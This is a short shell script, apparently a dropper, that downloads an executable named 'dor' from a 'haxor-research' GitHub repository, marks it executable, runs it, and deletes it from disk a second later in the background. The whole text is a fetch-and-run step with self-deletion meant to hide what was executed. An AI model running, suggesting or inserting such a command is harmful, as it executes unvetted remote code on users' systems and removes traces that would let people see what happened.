curl -fsSL https://raw.githubusercontent.com/haxor-research/tools/master/dor -o dor || exit
chmod +x ./dor || exit
(sleep 1 && rm ./dor & )
./dor
